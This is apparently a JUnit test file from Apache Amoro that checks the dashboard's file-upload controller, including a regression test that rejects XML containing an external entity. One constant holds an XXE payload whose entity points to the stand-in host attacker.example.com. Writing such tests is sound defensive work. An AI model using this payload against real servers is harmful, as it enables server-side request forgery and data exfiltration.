/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package org.apache.amoro.server.dashboard.controller;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertInstanceOf;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import io.javalin.http.Context;
import io.javalin.http.UploadedFile;
import org.apache.amoro.server.dashboard.PlatformFileManager;
import org.apache.amoro.server.dashboard.response.ErrorResponse;
import org.apache.amoro.server.dashboard.response.OkResponse;
import org.apache.amoro.server.dashboard.response.Response;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.mockito.ArgumentCaptor;

import java.io.ByteArrayInputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Map;

public class TestPlatformFileInfoController {

  private static final String VALID_SITE_XML =
      "<?xml version=\"1.0\"?>\n"
          + "<configuration>\n"
          + "  <property>\n"
          + "    <name>fs.defaultFS</name>\n"
          + "    <value>hdfs://localhost:9000</value>\n"
          + "  </property>\n"
          + "</configuration>\n";

  // payload shape from the security report: an external general entity that must never be
  // resolved by the server during upload validation
  private static final String XXE_PAYLOAD =
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
          + "<!DOCTYPE data [\n"
          + "  <!ENTITY ssrf SYSTEM \"https://attacker.example.com/leak\">\n"
          + "]>\n"
          + "<data>&ssrf;</data>";

  private PlatformFileManager platformFileManager;
  private PlatformFileInfoController controller;
  private Context ctx;

  @BeforeEach
  void setUp() {
    platformFileManager = mock(PlatformFileManager.class);
    controller = new PlatformFileInfoController(platformFileManager);
    ctx = mock(Context.class);
    when(platformFileManager.addFile(anyString(), anyString())).thenReturn(42);
  }

  private void stubUpload(String name, byte[] bytes) {
    UploadedFile file = mock(UploadedFile.class);
    when(file.getFilename()).thenReturn(name);
    when(file.getContent()).thenReturn(new ByteArrayInputStream(bytes));
    when(ctx.uploadedFile("file")).thenReturn(file);
  }

  private Response capturedResponse() {
    ArgumentCaptor<Response> captor = ArgumentCaptor.forClass(Response.class);
    verify(ctx).json(captor.capture());
    return captor.getValue();
  }

  @Test
  void uploadValidXmlStoresFile() throws Exception {
    byte[] bytes = VALID_SITE_XML.getBytes(StandardCharsets.UTF_8);
    stubUpload("core-site.xml", bytes);

    controller.uploadFile(ctx);

    verify(platformFileManager).addFile("core-site.xml", Base64.getEncoder().encodeToString(bytes));
    OkResponse<Map<String, String>> response =
        assertInstanceOf(OkResponse.class, capturedResponse());
    Map<String, String> result = response.getResult();
    assertEquals("42", result.get("id"));
    assertEquals("/api/ams/v1/files/42", result.get("url"));
  }

  @Test
  void uploadXmlWithExternalEntityIsRejectedWithoutStoring() throws Exception {
    stubUpload("evil.xml", XXE_PAYLOAD.getBytes(StandardCharsets.UTF_8));

    controller.uploadFile(ctx);

    ErrorResponse response = assertInstanceOf(ErrorResponse.class, capturedResponse());
    assertEquals(400, response.getCode());
    assertEquals("Uploaded file is not in valid XML format", response.getMessage());
    verify(platformFileManager, never()).addFile(anyString(), anyString());
  }

  @Test
  void uploadMalformedXmlIsRejectedWithoutStoring() throws Exception {
    stubUpload("broken.xml", "<configuration><property>".getBytes(StandardCharsets.UTF_8));

    controller.uploadFile(ctx);

    assertInstanceOf(ErrorResponse.class, capturedResponse());
    verify(platformFileManager, never()).addFile(anyString(), anyString());
  }

  @Test
  void uploadNonXmlFileBypassesXmlValidation() throws Exception {
    byte[] bytes = new byte[] {0x00, 0x01, 0x02, (byte) 0xff};
    stubUpload("user.keytab", bytes);

    controller.uploadFile(ctx);

    verify(platformFileManager).addFile("user.keytab", Base64.getEncoder().encodeToString(bytes));
    assertInstanceOf(OkResponse.class, capturedResponse());
  }
}
